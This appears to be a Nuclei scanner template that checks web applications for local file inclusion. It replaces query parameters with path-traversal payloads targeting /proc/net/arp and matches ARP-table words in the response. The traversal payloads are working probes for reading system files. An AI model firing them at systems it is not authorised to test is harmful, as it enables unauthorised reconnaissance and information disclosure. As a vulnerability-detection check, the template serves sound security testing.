id: linux-lfi-fuzz-arp-table

info:
  name: Local File Inclusion via ARP Table - Linux
  author: reewardius
  severity: high
  reference:
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt
    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
  tags: fuzzing-lfi,fuzzing-req

http:
  - method: GET
    path:
      - '{{BaseURL}}'
      
    payloads:
      nix_fuzz:
        - '/proc/net/arp'
        - '///////proc/net/arp'
        - '../../../../../../../../../../proc/net/arp'
        - '/../../../../../../../../../../proc/net/arp'
        
    fuzzing:
      - part: query
        type: replace
        mode: multiple
        fuzz:
          - '{{nix_fuzz}}'
          
    stop-at-first-match: true
    matchers:
      - type: word
        part: body
        words:
          - "address"
          - "type"
          - "Mask"
          - "Device"
        condition: and